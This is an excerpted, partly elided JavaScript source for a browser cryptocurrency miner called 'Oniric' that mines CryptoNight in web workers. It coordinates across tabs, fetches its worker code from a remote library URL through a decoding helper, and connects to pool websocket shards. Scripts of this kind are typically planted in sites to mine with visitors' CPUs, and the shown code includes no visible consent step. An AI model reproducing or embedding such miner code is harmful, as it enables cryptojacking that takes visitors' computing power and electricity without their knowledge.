(function(window) {
    ...
    var Miner = function(userID, params) {
        ...
        if (window.BroadcastChannel) {
            try {
                this._bc = new BroadcastChannel("Oniric");
    ...
    Miner.prototype.start = function(mode, optInToken) {
        this._tab.mode = mode || Oniric.IF_EXCLUSIVE_TAB;
        ...
        this._loadWorkerSource(
            function() {
                if (!this._verifyThread) {
                    this._verifyThread = new Oniric.JobThread();
                }
                var testJob = {
                    verify_id: "1",
                    nonce: "210e0000",
    ...
    Miner.prototype._loadWorkerSource = function(callback) {
        if (this._useWASM || this._asmjsStatus === "loaded") {
            ...
            xhr.addEventListener(
                "load",
                function() {
                    Oniric.CRYPTONIGHT_WORKER_BLOB = Oniric.Res(xhr.responseText);
                    this._asmjsStatus = "loaded";
                    callback();
                }.bind(this),
                xhr
            );
            xhr.open("get", Oniric.CONFIG.LIB_URL + Oniric.CONFIG.ASMJS_NAME, true);
            xhr.send();
        }
    };
    Miner.prototype._startNow = function() {
        if (this._tab.mode !== Oniric.FORCE_MULTI_TAB && !this._tab.interval) {
            this._tab.interval = setInterval(this._updateTabs.bind(this), 1e3);
        }
        if (this._tab.mode === Oniric.IF_EXCLUSIVE_TAB && this._otherTabRunning()) {
            return;
        }
        if (this._tab.mode === Oniric.FORCE_EXCLUSIVE_TAB) {
    ...
    Miner.prototype._otherTabRunning = function() {
        ...
        try {
            var tdjson = localStorage.getItem("Oniric");
            if (tdjson) {
    ...
    Miner.prototype._connect = function() {
        ...
        var shards = Oniric.CONFIG.WEBSOCKET_SHARDS;
    ...
    Miner.prototype._onMessage = function(ev) {
        ...
        if (msg.type === "job") {
            ...
            if (console && console.error) {
                console.error("Oniric Error:", msg.params.error);
            }
    ...
    window.Oniric = window.Oniric || {};
    window.Oniric.VERSION = 7;
    window.Oniric.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
    window.Oniric.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
    window.Oniric.FORCE_MULTI_TAB = "forceMultiTab";
    window.Oniric.DOMAIN = document.location.origin.split('/').pop() || null;
    window.Oniric.Init = function(userID, params) {
        userID = userID || Oniric.DOMAIN || "Oniric";
        var miner = new Miner(userID, params);
        return miner;
    };
    window.Oniric.Res = function(s) {
...
(function(window) {
    ...
    var JobThread = function() {
        this.worker = new Worker(Oniric.CRYPTONIGHT_WORKER_BLOB);
